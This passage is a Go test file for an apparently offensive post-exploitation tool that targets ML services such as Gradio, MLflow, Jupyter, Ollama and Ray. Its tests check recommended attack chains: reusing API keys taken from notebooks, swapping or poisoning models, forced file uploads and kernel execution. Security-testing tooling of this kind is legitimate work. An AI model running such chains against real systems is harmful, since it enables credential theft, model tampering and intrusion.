	}
}

func TestBuildGradioPredictWorkflowPlanWithFileRefs(t *testing.T) {
	plan := buildGradioPredictWorkflowPlan("http://127.0.0.1:7860", []string{"/tmp/file1.txt", "/tmp/file2.txt"}, "predict", 0)
	if plan.Stage != "proof" {
		t.Fatalf("expected stage proof, got %q", plan.Stage)
	}
	if plan.ChainSource != "gradio-predict" {
		t.Fatalf("expected chain_source gradio-predict, got %q", plan.ChainSource)
	}
	if len(plan.Recommendations) != 2 {
		t.Fatalf("expected 2 recommendations for file refs, got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[0].Command, "download-file --file /tmp/file1.txt") {
		t.Fatalf("expected first file ref in command, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[1].Command, "download-file --file /tmp/file2.txt") {
		t.Fatalf("expected second file ref in command, got %q", plan.Recommendations[1].Command)
	}
}

func TestBuildGradioPredictWorkflowPlanNoFileRefs(t *testing.T) {
	plan := buildGradioPredictWorkflowPlan("http://127.0.0.1:7860", nil, "predict", 0)
	if plan.Stage != "proof" {
		t.Fatalf("expected stage proof, got %q", plan.Stage)
	}
	if plan.Landed != "influenced" {
		t.Fatalf("expected landed influenced, got %q", plan.Landed)
	}
	if len(plan.Recommendations) == 0 {
		t.Fatal("expected at least one recommendation when no file refs")
	}
	hasQueue := false
	for _, rec := range plan.Recommendations {
		if strings.Contains(rec.Command, "queue-probe") {
			hasQueue = true
		}
	}
	if !hasQueue {
		t.Fatal("expected queue-probe recommendation when no file refs with api name")
	}
}

func TestBuildGradioQueueWorkflowPlanWithAPIName(t *testing.T) {
	plan := buildGradioQueueWorkflowPlan("http://127.0.0.1:7860", "predict", -1)
	if plan.Stage != "takeover" {
		t.Fatalf("expected stage takeover, got %q", plan.Stage)
	}
	if plan.ChainSource != "gradio-queue-probe" {
		t.Fatalf("expected chain_source gradio-queue-probe, got %q", plan.ChainSource)
	}
	if len(plan.Recommendations) != 1 {
		t.Fatalf("expected 1 recommendation, got %d", len(plan.Recommendations))
	}
	// upload-file targets the global upload surface; it takes --filename/--content, not
	// --api-name/--fn-index, so the generated command must not carry a route flag.
	if !strings.Contains(plan.Recommendations[0].Command, "upload-file --force-exploit") {
		t.Fatalf("expected a bare upload-file command, got %q", plan.Recommendations[0].Command)
	}
	if strings.Contains(plan.Recommendations[0].Command, "--api-name") {
		t.Fatalf("upload-file must not carry --api-name, got %q", plan.Recommendations[0].Command)
	}
	if !plan.Recommendations[0].Gated {
		t.Fatal("expected upload recommendation to be gated")
	}
}

func TestBuildGradioQueueWorkflowPlanWithFnIndex(t *testing.T) {
	plan := buildGradioQueueWorkflowPlan("http://127.0.0.1:7860", "", 3)
	if len(plan.Recommendations) != 1 {
		t.Fatalf("expected 1 recommendation for fn-index, got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[0].Command, "upload-file --force-exploit") {
		t.Fatalf("expected a bare upload-file command, got %q", plan.Recommendations[0].Command)
	}
	if strings.Contains(plan.Recommendations[0].Command, "--fn-index") {
		t.Fatalf("upload-file must not carry --fn-index, got %q", plan.Recommendations[0].Command)
	}
}

func TestBuildGradioQueueWorkflowPlanNoEndpoint(t *testing.T) {
	plan := buildGradioQueueWorkflowPlan("http://127.0.0.1:7860", "", -1)
	if len(plan.Recommendations) != 0 {
		t.Fatalf("expected 0 recommendations when no api name or fn-index, got %d", len(plan.Recommendations))
	}
}

func TestBuildMLflowDownloadArtifactSummaryWorkflowPlan(t *testing.T) {
	plan := buildMLflowDownloadArtifactSummaryWorkflowPlan("http://127.0.0.1:5000", "run-42", "model/MLmodel")
	if plan.Stage != "proof" {
		t.Fatalf("expected stage proof, got %q", plan.Stage)
	}
	if plan.Landed != "read-confirmed" {
		t.Fatalf("expected landed read-confirmed, got %q", plan.Landed)
	}
	if plan.ChainSource != "mlflow-download-artifact" {
		t.Fatalf("expected chain_source mlflow-download-artifact, got %q", plan.ChainSource)
	}
	if len(plan.Recommendations) != 2 {
		t.Fatalf("expected 2 recommendations, got %d", len(plan.Recommendations))
	}
	hasRuns := false
	hasRegistry := false
	for _, rec := range plan.Recommendations {
		if strings.Contains(rec.Command, "runs") {
			hasRuns = true
		}
		if strings.Contains(rec.Command, "registry") {
			hasRegistry = true
		}
	}
	if !hasRuns || !hasRegistry {
		t.Fatalf("expected runs and registry recommendations, got %#v", plan.Recommendations)
	}
}

func TestBuildMLflowBulkDownloadWorkflowPlan(t *testing.T) {
	plan := buildMLflowBulkDownloadWorkflowPlan("http://127.0.0.1:5000", "run-42", "fraud-model", "2", "model/MLmodel")
	if plan.ChainSource != "mlflow-bulk-download" {
		t.Fatalf("expected chain_source mlflow-bulk-download, got %q", plan.ChainSource)
	}
	commands := joinRecommendationCommands(plan.Recommendations)
	for _, want := range []string{
		"download-artifact --run-id run-42 --artifact-path model/MLmodel",
		"model-versions --model fraud-model",
		"swap-model --model fraud-model --source <your-artifact-uri> --force-exploit",
	} {
		if !strings.Contains(commands, want) {
			t.Fatalf("expected %q in workflow commands, got %s", want, commands)
		}
	}
	if !plan.Recommendations[len(plan.Recommendations)-1].Gated {
		t.Fatalf("expected swap-model recommendation to be gated")
	}
}

func TestBuildGradioEnumWorkflowPlanPlaceholders(t *testing.T) {
	plan := buildGradioEnumWorkflowPlan("http://host:7860", nil, nil)
	if !strings.Contains(plan.Recommendations[0].Command, "--api-name <api-name>") {
		t.Fatalf("expected placeholder api-name, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--fn-index <fn-index>") {
		t.Fatalf("expected placeholder fn-index, got %q", plan.Recommendations[1].Command)
	}
}

func TestBuildJupyterNotebooksSummaryWorkflowPlan(t *testing.T) {
	paths := []string{"work/demo.ipynb", "work/train.ipynb"}
	plan := buildJupyterNotebooksSummaryWorkflowPlan("http://127.0.0.1:8888", paths, []string{"k-1"})
	if plan.Stage != "notebooks" {
		t.Fatalf("expected stage notebooks, got %q", plan.Stage)
	}
	for _, p := range paths {
		found := false
		for _, rec := range plan.Recommendations {
			if strings.Contains(rec.Command, "--path "+p) {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("expected path %q in recommendations, got %#v", p, plan.Recommendations)
		}
	}
	lastRec := plan.Recommendations[len(plan.Recommendations)-1]
	if !lastRec.Gated {
		t.Fatalf("expected last recommendation (exec) to be gated, got %#v", lastRec)
	}
	if !strings.Contains(lastRec.Command, "--kernel k-1") {
		t.Fatalf("expected discovered kernel ID in exec command, got %q", lastRec.Command)
	}
}

func TestBuildJupyterNotebooksSummaryWorkflowPlanNoPaths(t *testing.T) {
	plan := buildJupyterNotebooksSummaryWorkflowPlan("http://127.0.0.1:8888", nil, nil)
	if !strings.Contains(plan.Recommendations[0].Command, "--path <path>") {
		t.Fatalf("expected placeholder path, got %q", plan.Recommendations[0].Command)
	}
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Fatalf("expected no gated recs when no kernel IDs, got %#v", rec)
		}
	}
}

func TestBuildMLflowRegistryWorkflowPlan(t *testing.T) {
	plan := buildMLflowRegistryWorkflowPlan("http://127.0.0.1:5000", "my-model")
	if plan.Stage != "correlation" {
		t.Fatalf("expected stage correlation, got %q", plan.Stage)
	}
	if plan.Landed != "reachable" {
		t.Fatalf("expected landed reachable, got %q", plan.Landed)
	}
	if len(plan.Recommendations) != 5 {
		t.Fatalf("expected 5 recommendations, got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--model my-model") {
		t.Fatalf("expected discovered model name, got %q", plan.Recommendations[1].Command)
	}
	if !plan.Recommendations[4].Gated || !strings.Contains(plan.Recommendations[4].Command, "hook --model my-model") {
		t.Fatalf("expected gated hook recommendation, got %#v", plan.Recommendations[4])
	}
}

func TestBuildOllamaEnumWorkflowPlan(t *testing.T) {
	plan := buildOllamaEnumWorkflowPlan("http://127.0.0.1:11434", []string{"llama3", "mistral"})
	if plan.Stage != "enum" {
		t.Fatalf("expected stage enum, got %q", plan.Stage)
	}
	if !strings.Contains(plan.Recommendations[0].Command, "prompts") {
		t.Fatalf("expected prompts as first recommendation, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--model llama3") {
		t.Fatalf("expected first discovered model, got %q", plan.Recommendations[1].Command)
	}
	if len(plan.Recommendations) != 4 {
		t.Fatalf("expected 4 recommendations with discovered model (incl poison), got %d", len(plan.Recommendations))
	}
	lastRec := plan.Recommendations[len(plan.Recommendations)-1]
	if !lastRec.Gated {
		t.Fatalf("expected poison recommendation to be gated, got %#v", lastRec)
	}
}

func TestBuildOllamaEnumWorkflowPlanPlaceholder(t *testing.T) {
	plan := buildOllamaEnumWorkflowPlan("http://host:11434", nil)
	if len(plan.Recommendations) != 3 {
		t.Fatalf("expected 3 recommendations without model (no poison), got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--model <model>") {
		t.Fatalf("expected placeholder model, got %q", plan.Recommendations[1].Command)
	}
}

func TestBuildOpenAICompatAuthWorkflowPlan(t *testing.T) {
	plan := buildOpenAICompatAuthWorkflowPlan("http://127.0.0.1:8000", "gpt-4", "inference-capable", []string{"empty-key", "test-key"})
	if plan.Stage != "auth-sweep" {
		t.Fatalf("expected stage auth-sweep, got %q", plan.Stage)
	}
	if !strings.Contains(plan.Rationale, "empty-key") || !strings.Contains(plan.Rationale, "test-key") {
		t.Fatalf("expected weak patterns in rationale, got %q", plan.Rationale)
	}
	if len(plan.Recommendations) != 5 {
		t.Fatalf("expected 5 recommendations for inference-capable, got %d", len(plan.Recommendations))
	}
	gatedCount := 0
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			gatedCount++
		}
	}
	if gatedCount != 3 {
		t.Fatalf("expected 3 gated recommendations, got %d", gatedCount)
	}
}

func TestBuildOpenAICompatAuthWorkflowPlanNonInferenceCapable(t *testing.T) {
	plan := buildOpenAICompatAuthWorkflowPlan("http://127.0.0.1:8000", "m1", "rejected", nil)
	if len(plan.Recommendations) != 0 {
		t.Fatalf("expected no recommendations for rejected target, got %#v", plan.Recommendations)
	}
	if !strings.Contains(plan.Rationale, "no OpenAI-compatible follow-on") {
		t.Fatalf("expected rejected rationale to explain no follow-on, got %q", plan.Rationale)
	}
}

func TestBuildOpenAICompatAuthWorkflowPlanInventoryOnly(t *testing.T) {
	plan := buildOpenAICompatAuthWorkflowPlan("http://127.0.0.1:8000", "m1", "inventory-only", nil)
	if len(plan.Recommendations) != 2 {
		t.Fatalf("expected 2 recommendations for inventory-only target, got %#v", plan.Recommendations)
	}
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Fatalf("expected no gated recs when not inference-capable, got %#v", rec)
		}
	}
}

func TestInjectOpenAICompatAPIKeyIntoPlan(t *testing.T) {
	plan := buildOpenAICompatAuthWorkflowPlan("http://127.0.0.1:8000", "m1", "inventory-only", nil)
	plan = injectOpenAICompatAPIKeyIntoPlan(plan, "sk-demo-key-1234567890abcdef")
	for _, rec := range plan.Recommendations {
		if strings.Contains(rec.Command, "openai-compat") && !strings.Contains(rec.Command, "--api-key sk-demo-key-1234567890abcdef") {
			t.Fatalf("expected --api-key in recommendation, got %q", rec.Command)
		}
		if strings.Contains(rec.Command, "auth-sweep --api-key") || strings.Contains(rec.Command, "enum --api-key") {
			t.Fatalf("expected --api-key before subcommand, got %q", rec.Command)
		}
	}
}

func TestBuildJupyterCredentialWorkflowPlanOpenAIKey(t *testing.T) {
	plan := buildJupyterCredentialWorkflowPlan("http://127.0.0.1:8888", "demo.ipynb", "OpenAI API Key", "sk-proj-demo-key-1234567890abcdef")
	if plan.Target != "<openai-compatible-target>" {
		t.Fatalf("expected OpenAI-compatible placeholder target, got %q", plan.Target)
	}
	if len(plan.Recommendations) != 2 {
		t.Fatalf("expected auth-sweep and enum recommendations, got %#v", plan.Recommendations)
	}
	if got := plan.Recommendations[0].Command; !strings.Contains(got, "--api-key sk-proj-demo-key-1234567890abcdef auth-sweep") {
		t.Fatalf("expected --api-key before auth-sweep, got %q", got)
	}
}

func TestBuildJupyterCredentialWorkflowPlanLabOpenAIKey(t *testing.T) {
	plan := buildJupyterCredentialWorkflowPlan("http://172.16.50.10:8888", "notebooks/rag-prototype.ipynb", "Anthropic API Key", "sk-ant-demo-key-1234567890abcdef")
	if plan.Target != "http://172.16.50.20:4000" {
		t.Fatalf("expected lab OpenAI-compatible target, got %q", plan.Target)
	}
	if got := plan.Recommendations[0].Command; !strings.Contains(got, "openai-compat --target http://172.16.50.20:4000 --api-key sk-ant-demo-key-1234567890abcdef auth-sweep") {
		t.Fatalf("expected concrete lab auth-sweep command, got %q", got)
	}
}

func TestBuildJupyterCredentialWorkflowPlanAnthropicKey(t *testing.T) {
	plan := buildJupyterCredentialWorkflowPlan("http://127.0.0.1:8888", "demo.ipynb", "Anthropic API Key", "sk-ant-demo-key-1234567890abcdef")
	if len(plan.Recommendations) != 1 {
		t.Fatalf("expected one Anthropic proxy recommendation, got %#v", plan.Recommendations)
	}
	if plan.Target != "<openai-compatible-target>" {
		t.Fatalf("expected OpenAI-compatible placeholder target, got %q", plan.Target)
	}
	if !strings.Contains(plan.Rationale, "OpenAI-compatible proxy") {
		t.Fatalf("expected rationale to name the OpenAI-compatible proxy flow, got %q", plan.Rationale)
	}
	if got := plan.Recommendations[0].Command; !strings.Contains(got, "openai-compat") || !strings.Contains(got, "--api-key sk-ant-demo-key-1234567890abcdef auth-sweep") {
		t.Fatalf("expected openai-compat --api-key recommendation, got %q", got)
	}
}

func TestDirectWorkflowEnrichmentDoesNotInventOpenAITargetFromJupyterEvidence(t *testing.T) {
	findings := []report.Finding{{
		ID:       "jupyter-cred",
		Source:   report.SourceJupyter,
		Target:   "http://172.16.50.10:8888",
		Title:    "Credential in notebook",
		Severity: report.SeverityHigh,
		Evidence: "sk-ant-demo-key-1234567890abcdef",
	}}
	plans := []workflowPlan{buildJupyterCredentialWorkflowPlan("http://172.16.50.10:8888", "demo.ipynb", "Anthropic API Key", "sk-ant-demo-key-1234567890abcdef")}
	enriched := enrichDirectWorkflowPlansWithCredentials(plans, findings)
	for _, plan := range enriched {
		if plan.Target == "http://172.16.50.10:8888" {
			for _, rec := range plan.Recommendations {
				if strings.Contains(rec.Command, "openai-compat") {
					t.Fatalf("did not expect OpenAI-compatible command against Jupyter target: %#v", enriched)
				}
			}
		}
	}
}

func TestBuildWandBEnumWorkflowPlanSetsTarget(t *testing.T) {
	plan := buildWandBEnumWorkflowPlan("http://127.0.0.1:8080/", "acme", "churn")
	if plan.Target != "http://127.0.0.1:8080" {
		t.Fatalf("expected canonical target, got %q", plan.Target)
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "wandb --target http://127.0.0.1:8080") {
		t.Fatalf("expected W&B recommendations to include target, got %#v", plan.Recommendations)
	}
}

func TestBuildRayEnumWorkflowPlan(t *testing.T) {
	plan := buildRayEnumWorkflowPlan("http://127.0.0.1:8265", true, []string{"job-abc"})
	if plan.Stage != "enum" {
		t.Fatalf("expected stage enum, got %q", plan.Stage)
	}
	if plan.Landed != "reachable" {
		t.Fatalf("expected landed reachable, got %q", plan.Landed)
	}
	if !strings.Contains(plan.Recommendations[0].Command, "jobs") {
		t.Fatalf("expected jobs as first rec when API reachable, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--job-id job-abc") {
		t.Fatalf("expected discovered job ID, got %q", plan.Recommendations[1].Command)
	}
	lastRec := plan.Recommendations[len(plan.Recommendations)-1]
	if !lastRec.Gated {
		t.Fatalf("expected submit recommendation to be gated, got %#v", lastRec)
	}
}

func TestBuildRayEnumWorkflowPlanNoJobsAPI(t *testing.T) {
	plan := buildRayEnumWorkflowPlan("http://127.0.0.1:8265", false, nil)
	if len(plan.Recommendations) != 0 {
		t.Fatalf("expected no recommendations when jobs API unreachable and no jobs, got %d", len(plan.Recommendations))
	}
}

func TestBuildVectorDBEnumWorkflowPlan(t *testing.T) {
	plan := buildVectorDBEnumWorkflowPlan("http://127.0.0.1:6333", "qdrant", []string{"documents", "embeddings"})
	if plan.Stage != "enum" {
		t.Fatalf("expected stage enum, got %q", plan.Stage)
	}
	if len(plan.Recommendations) != 2 {
		t.Fatalf("expected 2 recommendations, got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[0].Command, "--collection documents") {
		t.Fatalf("expected first discovered collection, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[0].Command, "--type qdrant") {
		t.Fatalf("expected provider in command, got %q", plan.Recommendations[0].Command)
	}
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Fatalf("expected no gated recs for vectordb enum, got %#v", rec)
		}
	}
}

func TestBuildVectorDBEnumWorkflowPlanPlaceholder(t *testing.T) {
	plan := buildVectorDBEnumWorkflowPlan("http://host:8000", "chromadb", nil)
	if !strings.Contains(plan.Recommendations[0].Command, "--collection <collection>") {
		t.Fatalf("expected placeholder collection, got %q", plan.Recommendations[0].Command)
	}
}

func TestBuildHostNextStepsGroupsByHostAndSuppressesGenericScan(t *testing.T) {
	plans := []workflowPlan{
		{
			Target: "http://172.16.50.20:8265",
			Recommendations: []workflowRecommendation{
				{Command: "aipostex scan targets --target http://172.16.50.20:8265 --tags ray"},
				{Command: "aipostex ray --target http://172.16.50.20:8265 enum"},
				{Command: "aipostex ray --target http://172.16.50.20:8265 jobs"},
				{Command: "aipostex ray --target http://172.16.50.20:8265 submit --force-exploit", Gated: true},
			},
		},
		{
			Target: "http://172.16.50.20:5000",
			Recommendations: []workflowRecommendation{
				{Command: "aipostex scan targets --target http://172.16.50.20:5000 --tags mlflow"},
				{Command: "aipostex mlflow --target http://172.16.50.20:5000 enum"},
			},
		},
	}

	next := buildHostNextSteps(plans, nil)
	hs, ok := next["172.16.50.20"]
	if !ok {
		t.Fatalf("expected host key 172.16.50.20 (matching groupFindingsByHost), got %#v", next)
	}
	// One "start here" command per service:port (ray + mlflow), generic scan suppressed.
	if len(hs.Commands) != 2 {
		t.Fatalf("expected 2 folded commands (one per service), got %#v", hs.Commands)
	}
	joined := strings.Join(hs.Commands, "\n")
	// The headline per service is the module command, not the generic scan.
	if !strings.Contains(joined, "ray --target http://172.16.50.20:8265 enum") {
		t.Fatalf("expected the ray enum headline, got %#v", hs.Commands)
	}
	if !strings.Contains(joined, "mlflow --target http://172.16.50.20:5000 enum") {
		t.Fatalf("expected the mlflow enum headline, got %#v", hs.Commands)
	}
	if strings.Contains(joined, "scan targets") {
		t.Fatalf("headline should be a module command, not a generic scan, got %#v", hs.Commands)
	}
	// Read commands across the host: :8265 has 3 (scan, enum, jobs), :5000 has 2
	// (scan, enum) → 5 total, 2 shown as headlines → 3 remaining under -v.
	if hs.MoreCount != 3 {
		t.Fatalf("expected MoreCount=3, got %d", hs.MoreCount)
	}
	// The gated submit command must not leak into the folded read list.
	if strings.Contains(joined, "--force-exploit") {
		t.Fatalf("gated command leaked into folded next-steps, got %#v", hs.Commands)
	}
}

func TestPrintGatedSummaryCountsUniqueGatedCommands(t *testing.T) {
	plans := []workflowPlan{
		{Target: "http://h:1", Recommendations: []workflowRecommendation{
			{Command: "a", Gated: true},
			{Command: "b enum"},
			{Command: "c --force-exploit", Gated: true},
		}},
		{Target: "http://h:2", Recommendations: []workflowRecommendation{
			{Command: "a", Gated: true}, // duplicate gated, counted once
		}},
	}
	var out strings.Builder
	printGatedSummary(&out, plans)
	s := out.String()
	if !strings.Contains(s, "2 gated") {
		t.Fatalf("expected '2 gated' unique count, got %q", s)
	}
}

func TestFindingServicePicksDominantTag(t *testing.T) {
	cases := []struct {
		tags []string
		want string
	}{
		{[]string{"ray", "jobs", "auth"}, "ray"},
		{[]string{"torchserve", "management"}, "torchserve"},
		{[]string{"litellm", "openai-compatible", "llmjacking"}, "litellm"}, // litellm rank wins
		{[]string{"vectordb", "nonsense"}, ""},                              // umbrella/unknown → none
	}
	for _, c := range cases {
		if got := findingService(report.Finding{Tags: c.tags}); got != c.want {
			t.Fatalf("findingService(%v) = %q, want %q", c.tags, got, c.want)
		}
	}
}

func TestBuildHostNextStepsMatchesFindingOverPhantomFingerprint(t *testing.T) {
	// :8265 co-fingerprinted as ollama AND ray; every finding is Ray. The fold must
	// suggest the ray command, not the alphabetically-first ollama one.
	plans := []workflowPlan{
		{Target: "http://172.16.50.20:8265", Recommendations: []workflowRecommendation{
			{Command: "aipostex ollama --target http://172.16.50.20:8265 enum"},
		}},
		{Target: "http://172.16.50.20:8265", Recommendations: []workflowRecommendation{
			{Command: "aipostex ray --target http://172.16.50.20:8265 enum"},
			{Command: "aipostex ray --target http://172.16.50.20:8265 jobs"},
		}},
	}
	findings := []report.Finding{
		{Source: report.SourceVulnCheck, Target: "http://172.16.50.20:8265", Severity: report.SeverityCritical, Tags: []string{"ray", "jobs"}},
	}
	hs := buildHostNextSteps(plans, findings)["172.16.50.20"]
	joined := strings.Join(hs.Commands, "\n")
	if !strings.Contains(joined, "ray --target http://172.16.50.20:8265") {
		t.Fatalf("expected a ray command driven by the finding, got %#v", hs.Commands)
	}
	if strings.Contains(joined, "ollama") {
		t.Fatalf("expected no ollama command (phantom co-match), got %#v", hs.Commands)
	}
}

func TestBuildHostNextStepsSynthesizesCommandForMgmtPort(t *testing.T) {
	// :8081 fingerprinted ambiguously → only a generic scan plan, but the finding says
	// TorchServe. The fold should synthesize a torchserve module command.
	plans := []workflowPlan{
		{Target: "http://172.16.50.20:8081", Recommendations: []workflowRecommendation{
			{Command: "aipostex scan targets --target http://172.16.50.20:8081"},
		}},
	}
	findings := []report.Finding{
		{Source: report.SourceVulnCheck, Target: "http://172.16.50.20:8081", Severity: report.SeverityHigh, Tags: []string{"torchserve", "management"}},
	}
	hs := buildHostNextSteps(plans, findings)["172.16.50.20"]
	joined := strings.Join(hs.Commands, "\n")
	if !strings.Contains(joined, "torchserve --target http://172.16.50.20:8081 enum") {
		t.Fatalf("expected a synthesized torchserve command, got %#v", hs.Commands)
	}
	if strings.Contains(joined, "scan targets") {
		t.Fatalf("expected the module command to replace the generic scan, got %#v", hs.Commands)
	}
}

func TestBuildHostNextStepsFallsBackForModulelessService(t *testing.T) {
	// langserve has a finding but no dedicated module → keep the generic scan (no regress).
	plans := []workflowPlan{
		{Target: "http://172.16.50.40:8090", Recommendations: []workflowRecommendation{
			{Command: "aipostex scan targets --target http://172.16.50.40:8090 --tags langchain,langserve"},
		}},
	}
	findings := []report.Finding{
		{Source: report.SourceVulnCheck, Target: "http://172.16.50.40:8090", Severity: report.SeverityHigh, Tags: []string{"langserve"}},
	}
	hs := buildHostNextSteps(plans, findings)["172.16.50.40"]
	joined := strings.Join(hs.Commands, "\n")
	if !strings.Contains(joined, "scan targets --target http://172.16.50.40:8090") {
		t.Fatalf("expected fallback to the generic scan for a module-less service, got %#v", hs.Commands)
	}
}

func TestBuildMLflowUploadArtifactWorkflowPlan(t *testing.T) {
	plan := buildMLflowUploadArtifactWorkflowPlan("http://h:5000", "aipostex-write/poison.txt", "impact", "influenced")
	joined := joinRecommendationCommands(plan.Recommendations)
	if len(plan.Recommendations) == 0 || !strings.Contains(joined, "registry") {
		t.Errorf("upload-artifact plan should chain to registry: %s", joined)
	}
	// The follow-ons are read-only correlation steps — never a gated command.
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Errorf("upload-artifact follow-ons must be read-only; got gated: %s", rec.Command)
		}
	}
}
